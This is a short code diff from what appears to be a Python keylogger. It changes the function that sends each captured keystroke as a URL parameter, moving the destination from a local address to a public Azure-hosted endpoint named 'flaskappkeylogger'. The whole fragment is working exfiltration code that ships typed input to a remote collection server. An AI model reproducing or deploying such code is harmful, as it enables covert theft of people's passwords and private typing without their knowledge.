@@ -15,7 +15,7 @@ line_length = 0
 
 def launch_request(key):
     try:
-        requests.get(f'http://192.168.1.177:5000/hello?key={key}')
+        requests.get(f'https://flaskappkeylogger.azurewebsites.net/hello?key={key}')
     except Exception as e:
         print(e)
 
